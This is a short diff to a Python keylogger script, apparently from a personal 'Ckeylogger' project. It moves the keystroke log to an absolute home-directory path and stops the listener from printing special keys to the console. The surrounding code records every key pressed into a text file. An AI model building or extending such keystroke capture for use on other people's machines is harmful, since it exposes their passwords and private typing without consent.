@@ -35,7 +35,7 @@ def write(key):
     keydata = str(key)
 
     # With file open with reading and writing permissions write and close the 'keydata' as sting characters
-    with open('Datat.txt', 'a') as file:
+    with open('/home/l3phant/PycharmProjects/Ckeylogger/Datat.txt', 'a') as file:
         if nospecial(keydata) == False or "Key.shift" in keydata:
             file.write(keydata)
 
@@ -51,7 +51,7 @@ def on_press(key):
         print("{0}".format(key.char))
 
     if nospecial(key) == False:
-            print("{0}".format(key))
+            print("{0}".format(''))
 
 
 # Using Listener, everytime on_press is activated function write activates
